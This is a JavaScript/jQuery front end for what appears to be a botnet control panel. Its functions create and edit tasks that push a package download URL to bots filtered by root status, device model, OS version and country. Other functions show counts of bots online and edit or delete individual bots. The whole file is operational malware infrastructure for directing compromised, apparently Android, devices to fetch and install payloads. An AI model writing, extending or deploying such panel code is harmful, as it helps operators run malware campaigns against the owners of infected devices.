function repeat_task(tasknumber){
	if(confirm('Start task?')){
	$.post("inc/task_controll.php",
    {
        todo: "repeat",
        number: tasknumber
    },
    function(data, status){
		
		if (data == "repeat_error")
		{
			alert("Ошибка: активная задачу уже есть или иная ошибка.\nСтатус запроса: " + status);
		}
		
		else
		{
			window.location.reload();
			
		}
        
    });
	}
}

function remove_task(tasknumber){
	$.post("inc/task_controll.php",
    {
        todo: "remove",
        number: tasknumber
    },
    function(data, status){
		
        window.location.reload();
    });
	
	
}
function stat_task(tasknumber){
	
	$.post("inc/task_stat.php",
    {    
        number: tasknumber
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		 $('#stat_task_num').html(obj.number);
		 $('#stat_task_run').html(obj.run);
		 $('#stat_task_take').html(obj.take);
		 $('#stat_task_procent').html (100 / obj.take * obj.run +"%");
		
		
    });
	
	
	$('#ModalStat').show(); 
	
}


function edit_task(tasknumber){
	
		$.post("inc/task_edit.php",
    {    
        number: tasknumber,
		type: 'get'
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		$('#real_task_id').val(obj.number);
		$('#myModalLabel1').html('Edit task: '+ obj.number);
		$('#task_edit_number').val(obj.number);
		$('#task_edit_package').val(obj.package);
		$('#task_edit_url').val(obj.url);
		$('#task_edit_size').val(obj.size);
		$('#task_edit_times').val(obj.times);
		$('#task_edit_root').val(obj.root);
		$('#task_edit_model').val(obj.model);
		$('#task_edit_osver').val(obj.osver);
		$('#task_edit_country').val(obj.country);
		$('#task_edit_lim').val(obj.lim);
		
		
		
		//$('#edit_task_run').html('Bots take file: ' + obj.start);
		//$('#edit_task_take').html('Bots run file: ' + obj.run);
		
		
		
    });
	
	
	$('#ModalEdit').show(); 
	
}


function edit_task_save(){								//Сохраняем задачу
	
	
	
	
	$.post("inc/task_edit.php",
    {    
		task: $('#real_task_id').val(),
        type: 'save',
		number: $('#task_edit_number').val(),
		pack: $('#task_edit_package').val(),
		url: $('#task_edit_url').val(),
		size: $('#task_edit_size').val(),
		times: $('#task_edit_times').val(),
		root: $('#task_edit_root').val(),
		model: $('#task_edit_model').val(),
		osver: $('#task_edit_osver').val(),
		country: $('#task_edit_country').val(),
		lim: $('#task_edit_lim').val()
    },
	function(data, status){
		location.reload();
		
		
    });
}

function addTask(){
	
	$.post("inc/task_add.php",
    {    
		
		number: $('#task_number').val(),
		pack: $('#task_package').val(),
		url: $('#task_url').val(),
		size: $('#task_size').val(),
		times: $('#task_times').val(),
		root: $('#task_root').val(),
		model: $('#task_model').val(),
		osver: $('#task_osver').val(),
		country: $('#task_country').val(),
		lim: $('#task_lim').val(),		
		landing: $('#task_landing').val(),
		packy: $('#task_packy').val(),
		packn: $('#task_packn').val(),
		clear_devices: $('#check-box-device').prop('checked'),
    },
	function(data, status){
		
		//location.reload();
		
    });
	
}


function del_Task(tasknum){
	if(confirm('Remove forever?')){
	$.post("inc/task_del.php",
    {    
		
		number: tasknum
		
    },
	function(data, status){
		location.reload();
		
		
    });
	}
}



function get_online(){
	

	$.post("inc/bots_online.php",
    {    
		
		
		
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		
		$('#week').html($('#week').html()+"Bots on this week: "+obj.week);
		$('#day').html($('#day').html()+"Bots in 24 hours: "+obj.day);
		$('#lasthour').html($('#lasthour').html()+"Bots in 1 hour: "+obj.hour);
		$('#now').html($('#now').html()+"Bots in 5 min: "+obj.min);
		
		
    });
	
	
	
}


function logout(){
	
	$.post("login.php",
    {    
		
		type: 'logout'
    },
	function(data, status){
		
		location.href= 'login.php';
		
    });
	
	
	
}



function bot_del(number){
	 if(confirm('Delete bot '+number+'?')){
              
     
	$.post("inc/bot_edit.php",
    {    
		id: number,
		todo:  'remove'
		
    },
	function(data, status){
		
		location.reload();
		
    });
	 } 
	
}

function bot_edit_get(id){
	
	$.post("inc/bot_edit.php",
    {    
		id: id,
		todo:  'edit_get'
		
    },
	function(data, status){
		
		$('#ModalEditBot').show();
		var obj = jQuery.parseJSON(data);
		
		$('#real_bot_id').val(obj.id);
		$('#bot_edit_model').val(obj.model);
		$('#bot_edit_country').val(obj.country);
		$('#bot_edit_group').val(obj.group_id);

		
		
		
    });
	
}

function bot_edit_save(id){
	
	 if(confirm(' Save bot '+$('#real_bot_id').val()+'?\n Will be saved \n Country'+$('#bot_edit_country').val()+'\n Model:'+$('#bot_edit_model').val()+'\n Group:'+$('#bot_edit_group').val())){
	$.post("inc/bot_edit.php",
    {    
		id: $('#real_bot_id').val(),
		country: $('#bot_edit_country').val(),
		model: $('#bot_edit_model').val(),
		group: $('#bot_edit_group').val(),
		todo:  'edit_save'
		
    },
	function(data, status){
		
		
		location.reload();
		
    });
	 }
	
}

